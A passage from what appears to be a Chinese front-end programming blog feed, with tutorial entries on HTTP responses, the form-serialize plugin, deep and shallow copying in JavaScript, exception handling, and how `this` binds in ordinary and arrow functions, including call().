</li><li>空行：分隔响应头，空行之后的是服务器返回的资源 </li><li>响应体：返回的资源</li></ol><h2 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h2><p><strong>HTTP 响应状态码</strong>：用来表明请求是否成功完成 </p><p>比如：404（服务器找不到资源）</p><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>1xx</td><td>信息</td></tr><tr><td>2xx</td><td>成功</td></tr><tr><td>3xx</td><td>重定向消息</td></tr><tr><td>4xx</td><td>客户端错误</td></tr><tr><td>5xx</td><td>服务端错误</td></tr></tbody></table><h1 id="接口文档"><a href="#接口文档" class="headerlink" title="接口文档"></a>接口文档</h1><p><strong>接口文档</strong>：描述接口的文章（一般是后端工程师，编写和提供）</p><p><strong>接口</strong>：指的使用 AJAX 和 服务器通讯时，使用的 URL，请求方法，以及参数，例如：<a href="https://apifox.com/apidoc/shared-1b0dd84f-faa8-435d-b355-5a8a329e34a8">AJAX阶段接口文档</a></p><p>例如：获取城市列表接口样子</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230404104720587.png" alt="image-20230404104720587.png"></p><h1 id="form-serialize-插件"><a href="#form-serialize-插件" class="headerlink" title="form-serialize 插件"></a>form-serialize 插件</h1><p>form-serialize 插件语法：</p><ol><li>引入 form-serialize 插件到自己网页中</li><li>使用 <code>serialize</code> 函数</li></ol><p><strong>函数参数</strong>：</p><ol><li>参数1：要获取的 form 表单标签对象（要求表单元素需要有 name 属性-用来作为收集的数据中属性名）</li><li>参数2：配置对象<ul><li>hash：<br>  true - 收集出来的是一个 JS 对象结构<br>  false - 收集出来的是一个查询字符串格式</li><li>empty：<br>  true - 收集空值<br>  false - 不收集空值</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example-form&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/form-serialize.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.example-form&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> data = <span class="title function_">serialize</span>(form, &#123;<span class="attr">hash</span>: <span class="literal">true</span>, <span class="attr">empty</span>: <span class="literal">true</span>&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240313211745.png" alt="image.png"></p><ul><li>收集到的数据名称是表单名称</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> AJAX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-深浅拷贝、异常处理、this、防抖节流</title>
      <link href="/2024/03/12/JavaScript-%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%E3%80%81%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E3%80%81this%E3%80%81%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81/"/>
      <url>/2024/03/12/JavaScript-%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%E3%80%81%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E3%80%81this%E3%80%81%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h1 id="深浅拷贝"><a href="#深浅拷贝" class="headerlink" title="深浅拷贝"></a>深浅拷贝</h1><p>在开发中经常需要复制，就会出现这种情况</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312094722.png" alt="image.png"></p><p>两个对象都指向同一个地址，所以修改一个的制，另一个也会变化</p><h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p>首先浅拷贝和深拷贝只针对引用类型</p><p>浅拷贝：拷贝的是<strong>地址</strong></p><p><strong>常见方法</strong>：</p><ol><li>拷贝对象：<code>Object.assgin()</code> &#x2F; 展开运算符 <code>&#123;...obj&#125;</code> 拷贝对象</li><li>拷贝数组：<code>Array.prototype.concat()</code> 或者 <code>[...arr]</code></li></ol><p>如果是简单数据类型拷贝值，引用数据类型拷贝的是地址 (简单理解： 如果是单层对象，没问题，如果有多层就有问题)</p><h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><p>首先浅拷贝和深拷贝只针对引用类型</p><p>深拷贝：拷贝的是<strong>对象</strong>，不是地址</p><p><strong>常见方法</strong>：</p><ol><li>通过递归实现深拷贝</li><li>lodash&#x2F;cloneDeep</li><li>通过<code>JSON.stringify()</code>实现</li></ol><p><strong>通过递归实现深拷贝</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">uname</span>: <span class="string">&#x27;kun&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">  <span class="attr">hobby</span>: [<span class="string">&#x27;唱&#x27;</span>, <span class="string">&#x27;跳&#x27;</span>, <span class="string">&#x27;rap&#x27;</span>, <span class="string">&#x27;篮球&#x27;</span>],</span><br><span class="line">  <span class="attr">family</span>: &#123;</span><br><span class="line"><span class="attr">baby</span>: <span class="string">&#x27;ikun&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> o = &#123;&#125;</span><br><span class="line"><span class="comment">// 拷贝函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deepCopy</span>(<span class="params">newObj, oldObj</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">in</span> oldObj) &#123;</span><br><span class="line"><span class="comment">// 处理数组的问题  一定先写数组 在写 对象 不能颠倒</span></span><br><span class="line"><span class="keyword">if</span> (oldObj[k] <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">  newObj[k] = []</span><br><span class="line">  <span class="comment">//  newObj[k] 接收 []  hobby</span></span><br><span class="line">  <span class="comment">//  oldObj[k]   [&#x27;唱&#x27;, &#x27;跳&#x27;, &#x27;rap&#x27;, &#x27;篮球&#x27;]</span></span><br><span class="line">  <span class="title function_">deepCopy</span>(newObj[k], oldObj[k])</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (oldObj[k] <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">  newObj[k] = &#123;&#125;</span><br><span class="line">  <span class="title function_">deepCopy</span>(newObj[k], oldObj[k])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">//  k  属性名 uname age    oldObj[k]  属性值  18</span></span><br><span class="line">  <span class="comment">// newObj[k]  === o.uname  给新对象添加属性</span></span><br><span class="line">  newObj[k] = oldObj[k]</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">deepCopy</span>(o, obj) <span class="comment">// 函数调用  两个参数 o 新对象  obj 旧对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o) <span class="comment">// 成功复制</span></span><br><span class="line">o.<span class="property">age</span> = <span class="number">20</span></span><br><span class="line">o.<span class="property">hobby</span>[<span class="number">4</span>] = <span class="string">&#x27;中分&#x27;</span></span><br><span class="line">o.<span class="property">family</span>.<span class="property">baby</span> = <span class="string">&#x27;小黑子&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj) <span class="comment">// 不会改变</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>, <span class="number">23</span>] <span class="keyword">instanceof</span> <span class="title class_">Object</span>)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312102426.png" alt="image.png"></p><p><strong>js库lodash里面<code>cloneDeep</code>内部实现了深拷贝</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/lodash.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> o = _.<span class="title function_">cloneDeep</span>(obj)</span></span><br><span class="line"><span class="language-javascript">o.<span class="property">family</span>.<span class="property">baby</span> = <span class="string">&#x27;小黑子&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(o)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312103749.png" alt="image.png"></p><p><strong>通过<code>JSON.stringify()</code>实现</strong>：</p><ul><li><code>JSON.stringify(obj)</code>：将对象<code>obj</code>序列化成一个JSON字符串。</li><li><code>JSON.parse(...)</code>：将上一步得到的JSON字符串反序列化成一个新的JavaScript对象。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj))</span><br><span class="line">o.<span class="property">uname</span> = <span class="string">&#x27;坤&#x27;</span></span><br><span class="line">o.<span class="property">family</span>.<span class="property">baby</span> = <span class="string">&#x27;小黑子&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312104313.png" alt="image.png"></p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="throw抛异常"><a href="#throw抛异常" class="headerlink" title="throw抛异常"></a>throw抛异常</h2><p>异常处理是指预估代码执行过程中可能发生的错误，然后最大程度的避免错误的发生导致整个程序无法继续运行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">counter</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(!x || !y) &#123;</span><br><span class="line"><span class="comment">// throw &#x27;参数不能为空!&#x27;;</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;参数不能为空!&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">counter</span>()</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312105456.png" alt="image.png"></p><p><strong>总结</strong>：</p><ol><li><code>throw</code> 抛出异常信息，程序也会<strong>终止执行</strong></li><li><code>throw</code> 后面跟的是错误提示信息</li><li><code>Error</code> 对象配合 <code>throw</code> 使用，能够设置更详细的错误信息</li></ol><h2 id="try-catch捕获错误信息"><a href="#try-catch捕获错误信息" class="headerlink" title="try&#x2F;catch捕获错误信息"></a>try&#x2F;catch捕获错误信息</h2><p>我们可以通过try&#x2F;catch捕获错误信息（浏览器提供的错误信息）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 查找 DOM 节点</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.p&#x27;</span>)</span><br><span class="line">p.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line"><span class="comment">// try 代码段中执行有错误时，会执行 catch 代码段</span></span><br><span class="line"><span class="comment">// 查看错误信息</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">message</span>)</span><br><span class="line"><span class="comment">// 终止代码继续执行</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;执行&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;如果出现错误，我的语句不会执行&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312110132.png" alt="image.png"></p><p><strong>总结</strong>：</p><ol><li><code>try...catch</code>用于捕获错误信息</li><li>将预估可能发生错误的代码写在<code>try</code>代码段中</li><li>如果<code>try</code>代码段中出现错误后，会执行<code>catch</code>代码段，并截获到错误信息</li><li><code>finally</code>不管是否有错误，都会执行</li></ol><h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>直接在代码中加入debugger，可以直接设置断点</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312110529.png" alt="image.png"></p><h1 id="处理this"><a href="#处理this" class="headerlink" title="处理this"></a>处理this</h1><h2 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h2><h3 id="普通函数"><a href="#普通函数" class="headerlink" title="普通函数"></a>普通函数</h3><p><strong>普通函数</strong>的调用方式决定this的值，就是谁调用的<code>this</code>就指向谁</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> sayHello = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sayHi</span>() <span class="comment">// window</span></span><br><span class="line"><span class="title function_">sayHello</span>() <span class="comment">// window</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;ikun&#x27;</span>,</span><br><span class="line"><span class="attr">word</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">user.<span class="title function_">word</span>() <span class="comment">// user</span></span><br><span class="line">user.<span class="property">sayHi</span> = sayHi</span><br><span class="line">user.<span class="title function_">sayHi</span>() <span class="comment">// user</span></span><br></pre></td></tr></table></figure><p>普通函数没有明确调用者时，<code>this</code>值为<code>window</code>，严格模式下没有调用者时<code>this</code>值为<code>undefined</code></p><h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><p>箭头函数的<code>this</code>与普通函数完全不一样，不受调用方式的影响，事实上箭头函数中并不存在<code>this</code></p><ol><li>箭头函数会默认帮我们绑定外层 <code>this</code> 的值，所以在箭头函数中 <code>this</code> 的值和外层的 <code>this</code> 是一样的 </li><li>箭头函数中的<code>this</code>引用的就是最近作用域中的<code>this</code> </li><li>向外层作用域中，一层一层查找<code>this</code>，直到有<code>this</code>的定义</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">sayHi</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;ikun&#x27;</span>,</span><br><span class="line"><span class="attr">word</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">hobby</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> love = [<span class="string">&#x27;唱&#x27;</span>, <span class="string">&#x27;跳&#x27;</span>, <span class="string">&#x27;rap&#x27;</span>, <span class="string">&#x27;篮球&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// user </span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// user 与hobby中的this一致</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">user.<span class="property">sayHi</span> = sayHi</span><br><span class="line">user.<span class="title function_">sayHi</span>() <span class="comment">// window 与函数声明环境中this值一致，也就是</span></span><br><span class="line">user.<span class="title function_">hobby</span>() <span class="comment">// user user 两个都是hobby的this值</span></span><br><span class="line">user.<span class="title function_">word</span>() <span class="comment">// window </span></span><br></pre></td></tr></table></figure><p><strong>ChatGPT的解释</strong>：</p><ul><li><code>user.sayHi()</code>: 在这里，<code>sayHi</code>是一个箭头函数，它在全局上下文中被定义。因此，当<code>user.sayHi()</code>被调用时，<code>this</code>指向箭头函数定义时的上下文，即全局对象（在浏览器中是<code>window</code>，在Node.js中可能是<code>global</code>或<code>globalThis</code>）。注意，即使<code>sayHi</code>被作为<code>user</code>对象的方法调用，由于它是箭头函数，这不会影响<code>this</code>的值。</li><li><code>user.hobby()</code>: <code>hobby</code>是使用<code>function</code>关键字定义的传统函数，并作为<code>user</code>对象的方法被调用。因此，在<code>hobby</code>函数内部，<code>this</code>指向调用它的对象，即<code>user</code>对象。同理，内部的箭头函数<code>fn</code>捕获了<code>hobby</code>函数中的<code>this</code>，所以在<code>fn</code>中<code>this</code>也指向<code>user</code>对象。</li><li><code>user.word()</code>: <code>word</code>是一个箭头函数，在<code>user</code>对象的定义中捕获了它定义时的<code>this</code>。由于<code>user</code>对象字面量不形成单独的作用域，<code>word</code>函数捕获的<code>this</code>是在包含<code>user</code>定义的外部作用域中的<code>this</code>，也就是全局对象。</li></ul><h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>在开发中使用箭头函数前需要考虑函数中 <code>this</code> 的值，<strong>事件回调函数</strong>使用箭头函数时，<code>this</code> 为全局的 <code>window</code>，因此<strong>DOM事件回调函数不推荐</strong>使用箭头函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOM 节点</span></span><br><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>)</span><br><span class="line"><span class="comment">// 箭头函数 此时 this 指向了 window</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 普通函数 此时 this 指向了 DOM 对象</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>同样由于箭头函数 <code>this</code> 的原因，<strong>基于原型的面向对象也不推荐</strong>采用箭头函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 原型对像上添加了箭头函数</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">walk</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;人都要走路...&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// window</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">p1.<span class="title function_">walk</span>()</span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ol><li>函数内不存在this，沿用上一级的</li><li>不适用于构造函数、原型函数、DOM事件函数等</li><li>适用于需要使用上层this的地方</li></ol><h2 id="改变this"><a href="#改变this" class="headerlink" title="改变this"></a>改变this</h2><p>JavaScript中还允许指定函数中<code>this</code>的指向，有3个方法可以动态指定普通函数中<code>this</code>的指向</p><ol><li><code>call()</code></li><li><code>apply()</code></li><li><code>bind()</code></li></ol><h3 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h3><p>使用 <code>call()</code> 方法调用函数，同时指定函数中 <code>this</code> 的值</p><p><strong>语法</strong>：<code>fn.call(thisArg, arg1, arg2, ...)</code></p><ul><li><code>thisArg</code>：在fn函数运行时指定的this值</li><li><code>arg1</code>、<code>arg2</code>：传递的其他参数</li><li>返回值就是函数的返回值，因为他就是调用函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> student = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小红&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数并指定 this 的值</span></span><br><span class="line">sayHi.<span class="title function_">call</span>(user); <span class="comment">// this 值为 user</span></span><br><span class="line">sayHi.<span class="title function_">call</span>(student); <span class="comment">// this 值为 student</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">counter</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用 counter 函数，并传入参数</span></span><br><span class="line"><span class="keyword">let</span> result = counter.<span class="title function_">call</span>(<span class="literal">null</span>, <span class="number">5</span>, <span class="number">10</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 15</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ol><li><code>call()</code> 方法能够在调用函数的同时指定 <code>this</code> 的值</li><li>使用 <code>call()</code> 方法调用函数时，第1个参数为 <code>this</code> 指定的值</li><li><code>call()</code> 方法的其余参数会依次自动传入函数做为函数的参数</li></ol><h3 id="apply"><a href="#apply" class="headerlink" title="apply()"></a>apply()</h3><p>使用 <code>apply()</code> 